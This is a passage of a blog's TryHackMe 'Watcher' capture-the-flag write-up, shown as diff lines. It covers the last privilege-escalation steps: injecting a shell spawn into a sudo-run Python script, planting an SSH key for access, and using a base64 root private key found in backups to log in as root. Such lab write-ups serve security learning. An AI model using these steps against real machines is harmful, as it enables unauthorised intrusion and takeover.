+        if(num == &quot;1&quot;):
+                return &quot;ls -lah&quot;
+        if(num == &quot;2&quot;):
+                return &quot;id&quot;
+        if(num == &quot;3&quot;):
+                return &quot;cat /etc/passwd&quot;
+mat@watcher:~/scripts$ cat will_script.py
+cat will_script.py
+import os
+import sys
+from cmd import get_command
+
+cmd = get_command(sys.argv[1])
+
+whitelist = [&quot;ls -lah&quot;, &quot;id&quot;, &quot;cat /etc/passwd&quot;]
+
+if cmd not in whitelist:
+        print(&quot;Invalid command!&quot;)
+        exit()
+
+os.system(cmd)
+</code></pre><p>Scripts are pretty straight forward. We can&rsquo;t change all the return statements.</p>
+<p>Clearly, we need to have a bash command/another rev shell command somewhere before. This requires editing stuff.</p>
+<pre><code>mat@watcher:~/scripts$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre><pre><code>mat@watcher:~/scripts$ nano cmd.py
+nano cmd.py
+Error opening terminal: unknown.
+</code></pre><p>Well &hellip; time to ssh in. Follow the tanget to setup ssh below.</p>
+<pre><code>mat@watcher:~$ mkdir .ssh
+mkdir .ssh
+mat@watcher:~$ cd .ssh
+cd .ssh
+mat@watcher:~/.ssh$ echo &quot;ssh-rsa {blah blah blah} kali@kali&quot; &gt; authorized_keys
+{some truncated stuff} kali@kali&quot; &gt; authorized_keys
+mat@watcher:~/.ssh$ 
+</code></pre><p><a class="link" href="https://community.perforce.com/s/article/6210"  target="_blank" rel="noopener"
+    >SSH permissions setting</a></p>
+<pre><code>mat@watcher:~/.ssh$ chmod 600 au
+chmod 600 authorized_keys 
+</code></pre><pre><code>mat@watcher:~$ chmod 700 .ssh
+chmod 700 .ssh
+</code></pre><pre><code>┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh mat@10.10.157.202                           
+
+...
+
+mat@watcher:~$ 
+</code></pre><p>YES!</p>
+<h3 id="33-lateral-privesc-again-again-will">3.3 Lateral PrivEsc (again) (again): Will</h3>
+<p>We edit and spawn a shell.</p>
+<pre><code>mat@watcher:~/scripts$ cat cmd.py 
+import pty
+def get_command(num):
+        pty.spawn(&quot;/bin/bash&quot;)
+        if(num == &quot;1&quot;):
+                return &quot;ls -lah&quot;
+        if(num == &quot;2&quot;):
+                return &quot;id&quot;
+        if(num == &quot;3&quot;):
+                return &quot;cat /etc/passwd&quot;
+</code></pre><pre><code>mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
+will@watcher:~/scripts$ 
+</code></pre><p>noice.</p>
+<h3 id="34-vertical-privesc">3.4 Vertical PrivEsc</h3>
+<p><img src="https://i.imgur.com/SPVaaSW.png" alt="Transferring files to the remote machine using python http server"  /></p>
+<p>I did same for linpeas (my fav).</p>
+<pre><code>[+] Readable files belonging to root and readable by me but not world readable
+-rw-rw---- 1 root adm 2270 Dec  3 02:04 /opt/backups/key.b64                                                                                                            
+-rw-r----- 1 root adm 21919802 May 25 16:59 /var/log/apache2/access.log
+-rw-r----- 1 root adm 29610 May 25 16:59 /var/log/apache2/error.log
+-rw-r----- 1 root adm 0 Dec  3 01:39 /var/log/apache2/other_vhosts_access.log
+-rw-r----- 1 root adm 28898 Dec 12 15:23 /var/log/apt/term.log
+
+</code></pre><p>First file looks interesting. Lesse</p>
+<pre><code>will@watcher:/home/will$ cat /opt/backups/key.b64
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
+...
+LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
+</code></pre><p>Looks like a id_rsa key format. Decoding base64, we get a private key!</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ssh -i id_rsa root@10.10.157.202
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)
+
+...
+
+Last login: Thu Dec  3 03:25:38 2020
+root@watcher:~#
+</code></pre><p>System fully compromised!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/lfi/">lfi</a>
+        
+            <a href="/tags/ftp/">ftp</a>
+        
+            <a href="/tags/crontab/">crontab</a>
+        
+            <a href="/tags/ssh/">ssh</a>
+        
+    </section>
+
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-anonymous-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/kd6mc4d.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/kd6mc4d.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Anonymous Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-break-out-the-cage-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/0MxLYQa.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/0MxLYQa.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Break Out The Cage Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-dog-cat-vm-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/nSkIlFr.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/nSkIlFr.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Dog Cat VM Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-looking-glass-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/UsmIsXh.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/UsmIsXh.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Looking Glass Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-overpass-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/LPggi78.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/LPggi78.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Overpass Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 Tanishq Chaudhary
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
